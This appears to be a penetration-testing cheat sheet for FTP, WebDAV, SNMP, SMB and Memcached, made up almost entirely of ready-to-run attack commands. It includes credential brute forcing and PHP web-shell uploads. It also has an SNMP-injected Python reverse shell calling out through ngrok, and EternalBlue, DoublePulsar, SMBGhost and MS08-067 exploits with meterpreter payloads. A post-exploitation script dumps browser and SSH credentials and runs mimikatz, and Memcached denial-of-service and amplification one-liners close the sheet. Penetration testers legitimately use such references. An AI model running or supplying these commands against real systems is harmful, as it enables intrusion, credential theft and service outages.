# Network Configuration

## Check List

* [ ] Review the applications’ configurations set across the network and validate that they are not vulnerable.
* [ ] Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.

## Cheat Sheet

### FTP

#### [Nmap](https://nmap.org)

{% hint style="info" %}
Identify FTP
{% endhint %}

```bash
nmap -p 21 -sS -sV --mtu 5000 --script banner $WEBSITE
```

{% hint style="info" %}
Anonymous Login
{% endhint %}

```bash
nmap -p 21 -sS -sV --mtu 5000 --script ftp-anon $WEBSITE
```

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
nmap -p 21 -sS -sV --mtu 5000 --script ftp-brute $WEBSITE
```

{% hint style="info" %}
Browser Login
{% endhint %}

```bash
ftp://anonymous:anonymous@$TARGET
```

#### [WGET](https://www.gnu.org/software/wget/)

{% hint style="info" %}
Download Files
{% endhint %}

```bash
wget --ftp-user=anonymous --ftp-password=anonymous ftp://$TARGET:21
```

#### [FTP](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)

{% hint style="info" %}
CLI Login
{% endhint %}

```bash
ftp
```

```bash
open $TARGET 21
```

{% hint style="info" %}
USER
{% endhint %}

```bash
> anonymous
```

{% hint style="info" %}
PASS
{% endhint %}

```bash
> anonymous
```

{% hint style="info" %}
FTP Mode
{% endhint %}

```bash
passive
```

{% hint style="info" %}
Download File
{% endhint %}

```bash
get file.txt
```

#### [Hydra](https://github.com/vanhauser-thc/thc-hydra)

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
hydra -V \
      -L /usr/share/seclists/Usernames/sap-default-usernames.txt \
      -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt ftp://$TARGET:21
```

#### [Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
Recon Version
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/ftp/ftp_version;
    set RHOSTS $WEBSITE;
    run;
    exit"
```

{% hint style="info" %}
Anonymous Login
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/ftp/anonymous;
    set RHOSTS $WEBSITE;
    run;
    exit"
```

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/ftp/ftp_login;
    set RHOSTS $WEBSITE;
    set USERPASS_FILE /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt;
    run;
    exit"
```

### WebDAV

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Identify WebDAV
{% endhint %}

```bash
nmap -p 80,443 \
     -sS -sV --mtu 5000 \
     --script http-methods,http-webdav-scan $WEBSITE
```

#### [Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
Scan WebDAV
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/http/webdav_scanner;
    set PATH /webdav;
    set RHOSTS $WEBSITE;
    exit"
```

#### [Hydra](https://github.com/vanhauser-thc/thc-hydra)

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
hydra -V \
      -L /usr/share/seclists/Usernames/sap-default-usernames.txt \
      -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt \
      $TARGET http-get /webdav/
```

#### [DavTest](https://gitlab.com/kalilinux/packages/davtest)

{% hint style="info" %}
Scan WebDAV
{% endhint %}

```bash
davtest -url $WEBSITE
```

{% hint style="info" %}
Upload Shell
{% endhint %}

```bash
davtest -url $WEBSITE \
        -uploadfile /usr/share/webshells/php/php-reverse-shell.php \
        -uploadloc shell.php
```

{% hint style="info" %}
Listening
{% endhint %}

```bash
nc -lvnp 1234
```

#### [Cadaver](https://github.com/notroj/cadaver)

```bash
cadaver $WEBSITE/webdav
```

{% hint style="info" %}
PUT Web shell
{% endhint %}

```bash
put /usr/share/webshells/php/php-reverse-shell.php
```

{% hint style="info" %}
Listening
{% endhint %}

```bash
nc -lvnp 1234
```

### SNMP

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Identify SNMP
{% endhint %}

```bash
nmap -p 161 -sU -sV --mtu 5000 --script snmp-info $WEBSITE
```

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
nmap -p 161 -sU -sV --mtu 5000 --script snmp-brute $WEBSITE
```

#### [SNMPWalk](https://linux.die.net/man/1/snmpwalk)

{% hint style="info" %}
Enumerate SNMP Public
{% endhint %}

```bash
snmpwalk -v1 -c public $TARGET
```

#### [Onesixtyone](https://github.com/trailofbits/onesixtyone)

{% hint style="info" %}
Enumerate SNMP Public
{% endhint %}

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET
```

#### [SNMPSet](https://linux.die.net/man/1/snmpset)

{% hint style="info" %}
SNMPv1
{% endhint %}

```bash
snmpset -v1 -c private $TARGET OID s "unk9vvn"
```

{% hint style="info" %}
SNMPv2
{% endhint %}

```bash
snmpset -v2c -c private $TARGET sysName.0 s "unk9vvn"
```

{% hint style="info" %}
Start Ngrok
{% endhint %}

```bash
ngrok http 4444 >/dev/null 2>&1 &
```

{% hint style="info" %}
Define ENV Ngrok
{% endhint %}

```bash
NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
```

{% hint style="info" %}
Inject RCE
{% endhint %}

```bash
snmpset -m +NET-SNMP-EXTEND-MIB \
        -v 2c \
        -c SuP3RPrivCom90 $TARGET 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"$NGHOST\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```

{% hint style="info" %}
Execute Command
{% endhint %}

```bash
snmpwalk -v2c -c SuP3RPrivCom90 $TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects
```

#### [Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
Enumerate SNMP Public
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/snmp/snmp_enum;
    set RHOSTS $WEBSITE;
    run;
    exit"
```

{% hint style="info" %}
Enumerate SNMP Private
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/snmp/snmp_enum;
    set RHOSTS $WEBSITE;
    set COMMUNITY private;
    run;
    exit"
```

{% hint style="info" %}
_Enumerate Windows Users_
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/snmp/snmp_enumusers;
    set RHOSTS $WEBSITE;
    run;
    exit"
```

_Enumerate File Shares_

```bash
msfconsole -qx "
    use auxiliary/scanner/snmp/snmp_enumshares;
    set RHOSTS $WEBSITE;
    run;
    exit"
```

### SMB

#### [Nmap](https://nmap.org/)

_Identify SMB_

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-protocols,smb-os-discovery,smb2-capabilities $WEBSITE
```

_Recon Vulns_

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-vuln-*,smb-double-pulsar-backdoor $WEBSITE
```

_Brute Force_

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-brute $WEBSITE
```

_Enumerate Users and Shares_

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-enum-users,smb-enum-shares $WEBSITE
```

_Enumerate Domains and Groups_

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-enum-domains,smb-enum-groups $WEBSITE
```

_Enumerate Services and Processes_

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-enum-services,smb-enum-processes $WEBSITE
```

#### [netexec](https://github.com/Pennyw0rth/NetExec)

Enum Host

```bash
netexec smb $TARGET
```

#### [enum4linux](https://gitlab.com/kalilinux/packages/enum4linux)

_Enumerate Shares_

```bash
enum4linux -a $TARGET
```

#### [nbtscan](https://salsa.debian.org/pkg-security-team/nbtscan)

_Enumerate Shares_

```bash
nbtscan -r $TARGET/24
```

#### [smbclient](https://www.learnlinux.org.za/courses/build/net-admin/ch08s02.html)

_User Enumeration and Null Sessions_

```bash
smbclient -N -L //$TARGET
```

#### [rpcclient](https://www.samba.org/samba/docs/4.17/man-html/rpcclient.1.html)

_User Enumeration and Null Sessions_

```bash
rpcclient -U "" $TARGET
```

#### [Metasploit](https://www.metasploit.com/)

_Detect Version_

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/smb_version;
    set RHOSTS $TARGET;
    run;
    exit"
```

_Enumerate Users_

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/smb_enumusers;
    set RHOSTS $TARGET;
    run;
    exit"
```

_Enumerate Shares_

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/smb_enumshares;
    set RHOSTS $TARGET;
    run;
    exit"
```

_Credential Dumps_

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/impacket/secretsdump;
    set RHOSTS $TARGET;
    run;
    exit"
```

_Credential Brute Force_

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/smb_login;
    set RHOSTS $TARGET;
    set SMBUser Administrator;
    set PASS_FILE /usr/share/seclists/Passwords/darkweb2017-top100.txt;
    run;
    exit"
```

_Detect EternalBlue_

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/smb_ms17_010;
    set RHOSTS $TARGET;
    run;
    exit"
```

_Start Ngrok_

```bash
ngrok http 4444 >/dev/null 2>&1 &
```

_Define ENV Ngrok_

```bash
NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
```

_Cert Spoof_

```bash
rm -rf /home/$USER/.msf4/loot/*
msfconsole -qx "
    use auxiliary/gather/impersonate_ssl;
    set RHOSTS google.com;
    run;
    exit"
```

_Define ENV Cert_

```bash
CERT=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.pem" -printf "%f\n" | head -n 1)
```

_Post-EXP_

```bash
cat > /tmp/post-exp.rc << EOF
getprivs
getsystem
run multi/gather/firefox_creds DECRYPT=true
run multi/gather/filezilla_client_cred
run multi/gather/ssh_creds
run multi/gather/thunderbird_creds
run multi/gather/wlan_geolocate
mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
bg
EOF
```

_EternalBlue Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)_

```bash
msfconsole -qx "
    use exploit/windows/smb/ms17_010_eternalblue;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

_Doublepulsar Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)_

```bash
msfconsole -qx "
    use exploit/windows/smb/smb_doublepulsar_rce;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

_SMBGhost Exploit (Win 10)_

```bash
msfconsole -qx "
    use exploit/windows/smb/cve_2020_0796_smbghost;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

_Net API Exploit (Win XP's)_

```bash
msfconsole -qx "
    use exploit/windows/smb/ms08_067_netapi;
    set PAYLOAD windows/meterpreter/reverse_hop_http;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

### Memcached

#### [Nmap](https://nmap.org/)

_Identify Memcached_

```bash
nmap -p 11211 -sS -sV --mtu 5000 --script memcached-info $WEBSITE
```

#### [Netcat](https://nmap.org/ncat/)

_Get Version_

```bash
echo "version" | nc -vn -w 1 $TARGET 11211
```

_Get Status_

```bash
echo "stats" | nc -vn -w 1 $TARGET 11211
```

_Get Slabs_

```bash
echo "stats slabs" | nc -vn -w 1 $TARGET 11211
```

_Get Items_

```bash
echo "stats items" | nc -vn -w 1 $TARGET 11211
```

_Get Key Names_

```bash
echo "stats cachedump 1 10" | nc -vn -w 1 $TARGET 11211
```

_Get Info Saved_

```bash
echo "get $ITEM" | nc -vn -w 1 $TARGET 11211
```

_Denial of Service_

```bash
for i in {1..10000}; do echo "set key$i 0 0 1024" | nc $TARGET 11211; done
```

_DDoS Amplification_

```bash
echo -e "\x00\x00\x00\x00\x00\x01\x00\x00stats\n" | nc -u -q 1 $TARGET 11211
```

#### [libmemcached-tools](https://libmemcached.org/libMemcached.html)

_Get Stats_

```bash
memcstat --servers=$TARGET
```

_Get all items_

```bash
memcdump --servers=$TARGET
```

_Get info inside the item(s)_

```bash
memccat --servers=$TARGET $ITEM1 $ITEM2 $ITEM3
```

[Metasploit](https://www.metasploit.com/)

_Extract Slabs_

```bash
msfconsole -qx "use auxiliary/gather/memcached_extractor;set RHOSTS $TARGET;run;exit"
```

_Denial of Service_

```bash
msfconsole -qx "use auxiliary/dos/misc/memcached;set RHOSTS $TARGET;run;exit"
```
